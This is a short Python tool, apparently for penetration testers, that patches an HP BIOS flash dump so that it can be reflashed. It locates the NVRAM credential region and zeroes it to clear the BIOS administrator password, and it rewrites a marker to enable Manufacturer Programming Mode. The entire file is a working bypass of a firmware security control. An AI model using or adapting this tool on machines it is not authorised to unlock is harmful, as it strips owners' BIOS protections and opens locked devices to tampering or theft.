import mmap
import shutil
import sys

def patch_nvram(filename):
    pattern_hex_nvram_creds = b'\x55\x00\x73\x00\x65\x00\x72\x00\x43\x00\x72\x00\x65\x00\x64'

    try:
        with open(filename, 'r+b') as file:
            print('\t[*] ATTEMPTING TO CLEAR ADMIN PASSWORD')
            with mmap.mmap(file.fileno(), 0) as mem:
                loc_nvram = mem.find(pattern_hex_nvram_creds)
                if loc_nvram == -1:
                    print('\t[-] ERROR: UNABLE TO LOCATE HP BIOS PASSWORD DATA')
                    return False
                print('\t[*] CREDENTIAL PATTERN FOUND AT OFFSET:', loc_nvram)

                print('\t[*] CLEARING NVRAM CRED SECTION')
                for elem in range(0, 100):
                    if elem > 10 and elem < 15:
                        mem[loc_nvram + len(pattern_hex_nvram_creds) + elem] = 0xFF
                    else:
                        mem[loc_nvram + len(pattern_hex_nvram_creds) + elem] = 0x00
                return True
    except Exception as e:
        print(f'\t[-] An error occurred while patching NVRAM: {e}')
        return False

def patch_mpm(filename):
    pattern_hex_mpm = b'\x48\x00\x70\x00\x4D\x00\x70\x00\x6D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xAA\x55'
    pattern_hex_mpm_patch = b'\x48\x00\x70\x00\x4D\x00\x70\x00\x6D\x00\x00\x00\x00\x23\x01\x00\x02\x00\x00\x00\xAA\x55'

    try:
        with open(filename, 'r+b') as file:
            print('\t[*] ATTEMPTING TO PATCH MANUFACTURER PROGRAMMING MODE')
            with mmap.mmap(file.fileno(), 0) as mem:
                loc_mpm = mem.find(pattern_hex_mpm)
                if loc_mpm == -1:
                    print('\t[-] MPM PATTERN NOT FOUND')
                    return False
                print('\t[*] MPM PATTERN FOUND AT OFFSET:', loc_mpm)
                print('\t[*] REPLACING MPM TRIGGERS')
                mem[loc_mpm:loc_mpm + len(pattern_hex_mpm_patch)] = pattern_hex_mpm_patch
                return True
    except Exception as e:
        print(f'\t[-] An error occurred while patching MPM: {e}')
        return False

if __name__ == "__main__":
    print('\nWelcome the PN-Tester HP BIOS patching tool\n')
    print('\n[!] USE THIS TOOL AT YOUR OWN RISK. MAKE SURE YOU HAVE BACKUPS OF ORIGINAL BIOS DATA BEFORE FLASHING\n')
    if len(sys.argv) != 2:
        print('\t[?] Provide path to .bin as parameter')
        sys.exit(1)

    filename = sys.argv[1]
    new_filename = sys.argv[1].split(".")[0] + "_patched.bin"
    shutil.copyfile(filename, new_filename) 

    if patch_nvram(new_filename):
        print("\n\t[+] Creds patched successfully.\n")
    if patch_mpm(new_filename):
        print("\n\t[+] MPM patched successfully.")
